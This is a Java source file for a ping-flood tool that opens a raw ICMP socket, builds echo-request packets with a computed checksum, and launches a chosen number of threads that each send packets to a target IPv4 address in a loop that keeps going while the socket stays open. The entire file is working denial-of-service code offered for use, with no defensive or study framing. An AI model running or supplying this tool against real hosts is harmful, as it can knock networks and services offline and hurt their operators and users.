
import static com.savarese.rocksaw.net.RawSocket.PF_INET;
import static com.savarese.rocksaw.net.RawSocket.getProtocolByName;

import java.io.IOException;
import java.io.InterruptedIOException;
import java.net.InetAddress;
import java.net.SocketException;
import java.nio.ByteBuffer;

import javax.swing.SwingUtilities;

import com.savarese.rocksaw.net.RawSocket;

public class PingFlood {

	private static final int TIMEOUT = 10000;

	private final RawSocket socket;
	private InetAddress target;

	public PingFlood() throws IllegalStateException, IOException {
		this.socket = new RawSocket();
		socket.open(PF_INET, getProtocolByName("icmp"));

		try {
			socket.setSendTimeout(TIMEOUT);
			socket.setReceiveTimeout(TIMEOUT);
		} catch (final SocketException se) {
			socket.setUseSelectTimeout(true);
			socket.setSendTimeout(TIMEOUT);
			socket.setReceiveTimeout(TIMEOUT);
		}
	}

	public void setTarget(final InetAddress host) {
		if (host != null)
			this.target = host;
	}

	public void run(int threadCount) throws Exception {
		if (this.target == null)
			return;

		final ICMP icmp = new ICMP(ICMP.ECHO_REQUEST, (byte) 0x0, (short) 0x0, (short) 0x1, (short) 0x1);
		final byte[] data = icmp.serializePacket();

		System.out.printf("Start sending ICMP requests on %s\n", this.target.getHostAddress());

		while (threadCount-- > 0) {
			Thread t = new Thread(() -> {
				
				for (boolean status = true; status;) {
					try {
						status = sendPacket(this.target, data, 0, data.length);
						if (!status)
							break;
					} catch (IllegalArgumentException | IOException e) {
						e.printStackTrace();
					}
				}
				
			});
			t.start();
		}
	}

	private final boolean sendPacket(final InetAddress host, final byte[] data, int offset, int len)
			throws IllegalArgumentException, InterruptedIOException, IOException {
		if (!socket.isOpen())
			return false;

		socket.write(host, data, offset, len);

		// System.out.println(byteArrayToHex(data));

		return true;
	}

	public static String byteArrayToHex(byte[] a) {
		StringBuilder sb = new StringBuilder(a.length * 2);
		for (byte b : a)
			sb.append(String.format("%02x", b) + "; ");
		return sb.toString();
	}

	public static void main(String[] args) {
		if (args.length != 2) {
			System.out.println("You must enter an IPv4 address and thread count [xxx.xxx.xxx.xxx 100]");
			return;
		}

		String[] nums = args[0].split("\\.");
		if (nums.length != 4) {
			System.out.println("Invalid IP adress format");
			return;
		}

		SwingUtilities.invokeLater(new Runnable() {
			public void run() {
				try {
					PingFlood pingFlood = new PingFlood();

					InetAddress target = InetAddress.getByAddress(
							new byte[] { (byte) Integer.parseInt(nums[0]), (byte) Integer.parseInt(nums[1]),
									(byte) Integer.parseInt(nums[2]), (byte) Integer.parseInt(nums[3]) });

					pingFlood.setTarget(target);
					pingFlood.run(Integer.parseInt(args[1]));

				} catch (IllegalStateException | IOException e) {
					e.printStackTrace();
				} catch (Exception e) {
					e.printStackTrace();
				}
			}
		});
	}

	/**************************************************************************************************************/
	// LOCAL CLASSES
	/**************************************************************************************************************/

	static abstract class Packet {

		protected Packet payloadPacket = null;

		public static int HEADER_LENGTH;

		public Packet getPayload() {
			return this.payloadPacket;
		}

		public void setPayload(Packet payload) {
			this.payloadPacket = payload;
		}

		public abstract byte[] serializePacket();
	}

	static class ICMP extends Packet {

		public static final byte ECHO_REPLY = 0x0;
		public static final byte DESTINATION_UNREACHABLE = 0x3;
		public static final byte SOURCE_QUENCH = 0x4;
		public static final byte REDIRECT_MESSAGE = 0x5;
		public static final byte ECHO_REQUEST = 0x8;
		public static final byte ROUTER_ADVERTISEMENT = 0x9;
		public static final byte ROUTER_SOLICITATION = 0xa;
		public static final byte TIME_EXCEEDED = 0xb;
		public static final byte BAD_IP_HEADER = 0xc;
		public static final byte TIMESTAMP = 0xd;
		public static final byte TIMESTAMP_REPLY = 0xe;
		public static final byte INFORMATION_REQUEST = 0xf;
		public static final byte INFORMATION_REPLY = 0x10;
		public static final byte ADDRESS_MASK_REQUEST = 0x11;
		public static final byte ADDRESS_MASK_REPLY = 0x12;
		public static final byte TRACEROUTE = 0x1e;
		public static final byte EXTENDED_ECHO_REQUEST = 0x2a;
		public static final byte EXTENDED_ECHO_REPLY = 0x2b;

		static {
			Packet.HEADER_LENGTH = 8;
		}

		public byte type;
		public byte code;
		public short checksum;
		public int headerData;

		public ICMP() {
			this.type = ICMP.ECHO_REPLY;
			this.code = 0x0;
			this.checksum = 0x0;
			this.headerData = 0x0;
		}

		public ICMP(byte type, byte code, short checksum, short id, short seq) {
			this.type = type;
			this.code = code;
			this.checksum = checksum;
			this.headerData = seq | id << 16;
		}

		@Override
		public byte[] serializePacket() {
			int length = Packet.HEADER_LENGTH;
			byte[] payloadData = null;
			if (this.getPayload() != null) {
				payloadData = this.getPayload().serializePacket();
				length += payloadData.length;
			}

			final byte[] data = new byte[length];
			final ByteBuffer bb = ByteBuffer.wrap(data);

			bb.put(this.type);
			bb.put(this.code);
			bb.putShort(this.checksum);
			bb.putInt(this.headerData);
			if (payloadData != null) {
				bb.put(payloadData);
			}

			if (this.checksum == 0) {
				bb.rewind();
				int accumulation = 0;
				for (int i = 0; i < length / 2; ++i) {
					accumulation += 0xffff & bb.getShort();
				}
				accumulation = (accumulation >> 16 & 0xffff) + (accumulation & 0xffff);
				this.checksum = (short) (~accumulation & 0xffff);
				bb.putShort(2, this.checksum);
			}

			return data;
		}

	}

}